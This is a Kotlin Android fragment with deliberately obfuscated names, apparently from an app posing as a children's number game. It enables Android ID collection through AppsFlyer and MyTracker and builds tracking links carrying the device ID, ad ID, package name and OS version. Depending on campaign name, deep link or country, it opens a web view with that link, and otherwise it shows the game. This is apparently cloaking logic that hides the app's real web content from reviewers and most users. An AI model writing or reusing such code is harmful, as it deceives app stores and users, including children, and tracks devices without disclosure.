package com.bimiboo.number

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import com.appsflyer.AppsFlyerLib
import com.bimiboo.number.applicati.BatmanClaas
import com.bimiboo.number.applicati.BatmanClaas.Companion.aps_idddddd
import com.bimiboo.number.applicati.BatmanClaas.Companion.paaaaaaackhyhyhyhy
import com.bimiboo.number.fraggmm.GaaaaaaammmiiiActivity2
import com.bimiboo.number.vebactiv.BrovvActivity
import com.my.tracker.MyTracker
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named


class FilllyFragment : Fragment() {

    val hyyhhyhy2 = "sub_id_6="
    val yh2hy2hy2hy = "naming"
    val hy2yh5hy5hy = "deeporg"
    val hyhyhy2hy = "sub_id_1="
    val bhyhynjmjmjmjj1m = "ad_id="

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_fillly, container, false)
    }

    override fun onAttach(context: Context) {
        super.onAttach(context)
        gtgtgtgtgthyyhhyhy = context
    }
    private lateinit var gtgtgtgtgthyyhhyhy: Context
    val ggtgokkgttgk: SharedPreferences by inject(named("SharedPreferences"))





    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        val counthhyyhhyhy = ggtgokkgttgk.getString("country", null)
        val jujuujujujujuj = Build.VERSION.RELEASE
        val countryDevgtgtgtgt = ggtgokkgttgk.getString("countryDev", null)
        val deepStgttgtgt = ggtgokkgttgk.getString("deepSt", null)

        val yhyhhfihdegedh = ggtgokkgttgk.getString("apps", null)
        val appCampgtgtgtgt = ggtgokkgttgk.getString("appCamp", null)

        val wvgtgtgtgtgt = ggtgokkgttgk.getString("wv", null)
        val bgngtngtjgtj = ggtgokkgttgk.getString("mainId", null)
        val packtgtgtgtgt = paaaaaaackhyhyhyhy

        val myTrIdffrrfrf = ggtgokkgttgk.getString(BatmanClaas.instIdfrfrf, null)
        val gtntggtgthhgtgt = MyTracker.getTrackerParams()
        gtntggtgthhgtgt.setCustomUserId(myTrIdffrrfrf)


        val hfrfryrfggrfgrfy = Intent(activity, BrovvActivity::class.java)
        val gtgtgtgttg = Intent(activity, GaaaaaaammmiiiActivity2::class.java)


        val hyhyhyhyhyhy = AppsFlyerLib.getInstance().getAppsFlyerUID(gtgtgtgtgthyyhhyhy)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        ggtgokkgttgk.edit().putString(aps_idddddd, hyhyhyhyhyhy).apply()

        val gtgtjigtjgti = "$wvgtgtgtgtgt$hyhyhy2hy$appCampgtgtgtgt&$onefrfrrfrf$hyhyhyhyhyhy&$bhyhynjmjmjmjj1m$bgngtngtjgtj&$subFourggtgt$packtgtgtgtgt&$subFiverrrrrrr$jujuujujujujuj&$hyyhhyhy2$yh2hy2hy2hy"
        val gthugt = "$wvgtgtgtgtgt$onefrfrrfrf$myTrIdffrrfrf&$bhyhynjmjmjmjj1m$myTrIdffrrfrf&$subFourggtgt$packtgtgtgtgt&$subFiverrrrrrr$jujuujujujujuj&$hyyhhyhy2$yh2hy2hy2hy"
        val gtjtgjtgjgtjgt = "$wvgtgtgtgtgt$hyhyhy2hy$deepStgttgtgt&$onefrfrrfrf$hyhyhyhyhyhy&$bhyhynjmjmjmjj1m$bgngtngtjgtj&$subFourggtgt$packtgtgtgtgt&$subFiverrrrrrr$jujuujujujujuj&$hyyhhyhy2$hy2yh5hy5hy"
        val linkFBNullAppsfrrffrrffr = "$wvgtgtgtgtgt$hyhyhy2hy$deepStgttgtgt&$onefrfrrfrf$myTrIdffrrfrf&$bhyhynjmjmjmjj1m$myTrIdffrrfrf&$subFourggtgt$packtgtgtgtgt&$subFiverrrrrrr$jujuujujujujuj&$hyyhhyhy2$hy2yh5hy5hy"

        when(yhyhhfihdegedh) {
            "1" ->
                if(appCampgtgtgtgt!!.contains("tdb2")) {
                    Log.d("lolo", "appCampgtgtgtgt!!.contains(tdb2)")
                    ggtgokkgttgk.edit().putString("link", gtgtjigtjgti).apply()
                    ggtgokkgttgk.edit().putString("WebInt", "campaign").apply()
                    startActivity(hfrfryrfggrfgrfy)
                    tgojtjojgtojigt()
                } else if (deepStgttgtgt!=null||countryDevgtgtgtgt!!.contains(counthhyyhhyhy.toString())) {
                    Log.d("lolo", "countryDevgtgtgtgt!!.contains(counthhyyhhyhy.toString()")

                    ggtgokkgttgk.edit().putString("link", gtjtgjtgjgtjgt).apply()
                    ggtgokkgttgk.edit().putString("WebInt", "deepLink").apply()
                    startActivity(hfrfryrfggrfgrfy)
                    tgojtjojgtojigt()
                } else {
                    startActivity(gtgtgtgttg)
                    tgojtjojgtojigt()
                }
            "0" ->
                if(deepStgttgtgt!=null) {
                    Log.d("lolo", "0 deepStgttgtgt!=null")
                    ggtgokkgttgk.edit().putString("link", linkFBNullAppsfrrffrrffr).apply()
                    ggtgokkgttgk.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(hfrfryrfggrfgrfy)
                    tgojtjojgtojigt()
                } else if (countryDevgtgtgtgt!!.contains(counthhyyhhyhy.toString())) {
                    Log.d("lolo", "0 countryDevgtgtgtgt!!.contains(counthhyyhhyhy.toString())")
                    ggtgokkgttgk.edit().putString("link", gthugt).apply()
                    ggtgokkgttgk.edit().putString("WebInt", "geo").apply()
                    startActivity(hfrfryrfggrfgrfy)
                    tgojtjojgtojigt()
                } else {
                    startActivity(gtgtgtgttg)
                    tgojtjojgtojigt()
                }
        }
    }

    private fun tgojtjojgtojigt() {
        activity?.finish()
    }


    val subFourggtgt = "sub_id_4="
    val subFiverrrrrrr = "sub_id_5="
    val onefrfrrfrf = "deviceID="

}
